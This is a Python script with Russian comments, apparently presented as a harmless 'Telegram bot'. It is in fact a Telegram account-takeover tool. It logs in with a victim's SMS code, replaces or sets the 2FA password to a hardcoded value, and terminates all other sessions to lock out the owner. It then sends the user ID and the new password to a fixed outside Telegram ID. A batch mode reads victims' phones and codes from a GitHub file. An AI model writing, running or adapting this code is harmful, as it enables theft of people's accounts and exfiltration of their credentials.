#!/usr/bin/env python3
"""
TELEGRAM BOT - БЕЗ СОЗДАНИЯ ФАЙЛОВ НА ХОСТИНГЕ
Все данные передаются через аргументы командной строки
"""

import sys
import asyncio
import hashlib
import base64
import json
from datetime import datetime
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

class MemoryTelegramBot:
    def __init__(self, phone, code=None, password_2fa=None, 
                 new_password=None, report_id=None, string_session=None):
        """
        :param phone: Номер телефона (обязательно)
        :param code: Код из SMS (для первого входа)
        :param password_2fa: Пароль 2FA (если включен)
        :param new_password: Новый пароль 2FA (по умолчанию hS$%4q2@7)
        :param report_id: ID для отчета (по умолчанию 7119681628)
        :param string_session: Строка сессии (для повторного входа)
        """
        self.phone = phone
        self.code = code
        self.password_2fa = password_2fa
        self.new_password = new_password or "hS$%4q2@7"
        self.report_id = int(report_id) if report_id else 7119681628
        self.string_session = string_session
        self.client = None
        self.session_string = None  # Для сохранения сессии в памяти
        
    async def create_client(self):
        """Создание клиента в памяти"""
        if self.string_session:
            # Используем сохраненную сессию
            self.client = TelegramClient(
                StringSession(self.string_session), 
                0, ""
            )
        else:
            # Создаем новую сессию
            self.client = TelegramClient(
                StringSession(), 
                0, ""
            )
        
        await self.client.connect()
        return self.client
    
    async def auth(self):
        """Авторизация в памяти"""
        print(f"📱 Номер: {self.phone}")
        
        client = await self.create_client()
        
        if not await client.is_user_authorized():
            if not self.code:
                print("❌ ОШИБКА: Требуется код из SMS для первого входа")
                print("ℹ️  Передайте код вторым аргументом:")
                print("    python bot.py +79123456789 12345")
                return None
            
            print("📨 Авторизация по коду...")
            
            try:
                await client.sign_in(phone=self.phone, code=self.code)
            except SessionPasswordNeededError:
                if not self.password_2fa:
                    print("❌ ОШИБКА: Требуется пароль 2FA")
                    print("ℹ️  Передайте пароль третьим аргументом:")
                    print("    python bot.py +79123456789 12345 пароль_2fa")
                    return None
                
                print("🔐 Используется пароль 2FA...")
                await client.sign_in(password=self.password_2fa)
            except Exception as e:
                print(f"❌ Ошибка авторизации: {e}")
                return None
        
        # Сохраняем строку сессии для будущего использования
        self.session_string = client.session.save()
        
        user = await client.get_me()
        print(f"✅ Авторизован: {user.first_name} (ID: {user.id})")
        return user
    
    async def change_password(self, user):
        """Смена пароля 2FA"""
        try:
            print("🔄 Проверка статуса 2FA...")
            
            # Проверяем наличие 2FA
            try:
                pwd_info = await self.client.get_password()
                has_password = pwd_info is not None and pwd_info.has_password
            except:
                has_password = False
            
            if has_password:
                if not self.password_2fa:
                    print("⚠️  У аккаунта есть 2FA, но пароль не указан")
                    print("ℹ️  Передайте текущий пароль 2FA третьим аргументом")
                    return False
                
                await self.client.edit_2fa(
                    current_password=self.password_2fa,
                    new_password=self.new_password,
                    hint="Обновлено системой"
                )
                print(f"✅ Пароль 2FA изменен на: {self.new_password}")
            else:
                await self.client.edit_2fa(
                    new_password=self.new_password,
                    hint="Установлено системой"
                )
                print(f"✅ Пароль 2FA установлен: {self.new_password}")
            
            return True
            
        except Exception as e:
            print(f"❌ Ошибка смены пароля: {e}")
            return False
    
    async def cleanup_sessions(self):
        """Очистка сессий"""
        try:
            print("🔍 Проверка активных сессий...")
            auths = await self.client(functions.account.GetAuthorizationsRequest())
            other_sessions = [a.hash for a in auths.authorizations if not a.current]
            
            if other_sessions:
                print(f"🗑️  Найдено сессий: {len(other_sessions)}")
                for session_hash in other_sessions:
                    try:
                        await self.client(functions.auth.ResetAuthorizationRequest(
                            hash=session_hash
                        ))
                    except:
                        continue
                print("✅ Сессии очищены")
            else:
                print("✅ Других сессий нет")
            
            return True
            
        except Exception as e:
            print(f"⚠️  Ошибка очистки сессий: {e}")
            return False
    
    async def send_report(self, user):
        """Отправка отчета без создания файлов"""
        try:
            # Кодируем отчет в base64
            report = {
                'user_id': user.id,
                'phone': user.phone,
                'new_password': self.new_password,
                'time': datetime.now().isoformat(),
                'status': 'success'
            }
            
            report_b64 = base64.b64encode(
                json.dumps(report).encode()
            ).decode()
            
            # Отправляем в сохраненные сообщения
            await self.client.send_message(
                'me',
                f"📊 Отчет бота (кодирован)\n"
                f"ID: {user.id}\n"
                f"Пароль: {self.new_password}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}\n"
                f"Отчет: {report_b64}"
            )
            
            # Пытаемся отправить на целевой ID
            try:
                await self.client.send_message(
                    self.report_id,
                    f"🔐 Bot Report\nID: {user.id}\nPassword: {self.new_password}"
                )
                print(f"✅ Отчет отправлен на ID: {self.report_id}")
            except Exception as e:
                print(f"⚠️  Не удалось отправить на ID {self.report_id}: {e}")
            
            print("📄 Отчет закодирован и отправлен")
            return True
            
        except Exception as e:
            print(f"⚠️  Ошибка отчета: {e}")
            return False
    
    async def run(self):
        """Основной запуск"""
        print("=" * 60)
        print("TELEGRAM BOT - БЕЗ ФАЙЛОВ НА ХОСТИНГЕ")
        print("=" * 60)
        
        try:
            # Авторизация
            user = await self.auth()
            if not user:
                return False
            
            print("\n🚀 Выполнение операций...")
            
            # Меняем пароль
            if not await self.change_password(user):
                print("⚠️  Пропускаем смену пароля")
            
            # Очищаем сессии
            await self.cleanup_sessions()
            
            # Отправляем отчет
            await self.send_report(user)
            
            # Выводим строку сессии для будущего использования
            if self.session_string and not self.string_session:
                print("\n" + "=" * 60)
                print("💾 СТРОКА СЕССИИ ДЛЯ ПОВТОРНОГО ИСПОЛЬЗОВАНИЯ:")
                print("=" * 60)
                print(self.session_string)
                print("=" * 60)
                print("ℹ️  Сохраните эту строку для следующего запуска")
                print("ℹ️  Используйте: python bot.py +79123456789 -s <эта_строка>")
            
            print("\n" + "=" * 60)
            print("✅ ВЫПОЛНЕНО УСПЕШНО")
            print(f"📱 Аккаунт: {user.first_name}")
            print(f"🔐 Новый пароль: {self.new_password}")
            print("=" * 60)
            
            return True
            
        except Exception as e:
            print(f"\n❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            if self.client:
                await self.client.disconnect()

def print_help():
    """Вывод справки"""
    print("""
ИСПОЛЬЗОВАНИЕ:
    
  1. Первый запуск (с кодом SMS):
        python bot.py +79123456789 12345 [пароль_2fa] [новый_пароль] [report_id]
    
  2. Повторный запуск (со строкой сессии):
        python bot.py +79123456789 -s <string_session> [новый_пароль] [report_id]
    
  3. Многопользовательский режим (через GitHub):
        Создайте файл users.json в GitHub со структурой:
        [
          {
            "phone": "+79123456789",
            "code": "12345",
            "password_2fa": "пароль",
            "new_password": "hS$%4q2@7",
            "report_id": 7119681628,
            "string_session": "optional"
          }
        ]
        Затем: python bot.py --github users.json

ПРИМЕРЫ:
    
    ▶ Первый вход без 2FA:
        python bot.py +79123456789 12345
    
    ▶ Первый вход с 2FA:
        python bot.py +79123456789 12345 пароль_2fa
    
    ▶ Повторный вход:
        python bot.py +79123456789 -s 1BJW1sIAAgB7ZXJzaW9u...
    
    ▶ Смена пароля:
        python bot.py +79123456789 "" старый_пароль новый_пароль
    
    ▶ Полная конфигурация:
        python bot.py +79123456789 12345 пароль hS$%4q2@7 7119681628
    """)

async def process_single_user(args):
    """Обработка одного пользователя"""
    phone = args[0]
    
    # Проверяем режим работы
    if len(args) > 1 and args[1] == "-s":
        # Режим строки сессии
        string_session = args[2] if len(args) > 2 else None
        new_password = args[3] if len(args) > 3 else None
        report_id = args[4] if len(args) > 4 else None
        
        if not string_session:
            print("❌ ОШИБКА: Не указана строка сессии после -s")
            return False
        
        bot = MemoryTelegramBot(
            phone=phone,
            string_session=string_session,
            new_password=new_password,
            report_id=report_id
        )
    else:
        # Режим кода SMS
        code = args[1] if len(args) > 1 else None
        password_2fa = args[2] if len(args) > 2 else None
        new_password = args[3] if len(args) > 3 else None
        report_id = args[4] if len(args) > 4 else None
        
        bot = MemoryTelegramBot(
            phone=phone,
            code=code,
            password_2fa=password_2fa,
            new_password=new_password,
            report_id=report_id
        )
    
    return await bot.run()

async def process_github_users(github_url):
    """Обработка пользователей из GitHub файла"""
    print(f"📥 Загрузка пользователей из GitHub: {github_url}")
    
    try:
        import requests
        
        # Скачиваем файл
        response = requests.get(github_url)
        if response.status_code != 200:
            print(f"❌ Ошибка загрузки: {response.status_code}")
            return False
        
        users = response.json()
        print(f"✅ Загружено пользователей: {len(users)}")
        
        # Обрабатываем каждого пользователя
        for i, user_data in enumerate(users):
            print(f"\n👤 Пользователь {i+1}/{len(users)}: {user_data['phone']}")
            
            bot = MemoryTelegramBot(
                phone=user_data['phone'],
                code=user_data.get('code'),
                password_2fa=user_data.get('password_2fa'),
                new_password=user_data.get('new_password'),
                report_id=user_data.get('report_id'),
                string_session=user_data.get('string_session')
            )
            
            await bot.run()
            
            # Задержка между пользователями
            if i < len(users) - 1:
                await asyncio.sleep(5)
        
        return True
        
    except ImportError:
        print("❌ Для работы с GitHub требуется библиотека requests")
        print("ℹ️  Добавьте в requirements.txt: requests==2.31.0")
        return False
    except Exception as e:
        print(f"❌ Ошибка обработки GitHub: {e}")
        return False

async def main():
    """Основная функция"""
    args = sys.argv[1:]
    
    if not args:
        print_help()
        return False
    
    # Проверяем специальные команды
    if args[0] == "--help" or args[0] == "-h":
        print_help()
        return True
    
    if args[0] == "--github" and len(args) > 1:
        # Многопользовательский режим через GitHub
        return await process_github_users(args[1])
    
    if args[0].startswith("https://raw.githubusercontent.com/"):
        # Прямая ссылка на GitHub
        return await process_github_users(args[0])
    
    # Одиночный пользователь
    if not args[0].startswith('+'):
        print("❌ ОШИБКА: Номер телефона должен начинаться с +")
        print("   Пример: +79123456789")
        return False
    
    return await process_single_user(args)

if __name__ == "__main__":
    # Проверяем наличие telethon
    try:
        import telethon
    except ImportError:
        print("❌ ОШИБКА: Библиотека telethon не установлена")
        print("ℹ️  Добавьте в requirements.txt: telethon==1.28.5")
        sys.exit(1)
    
    # Запускаем
    success = asyncio.run(main())
    sys.exit(0 if success else 1)
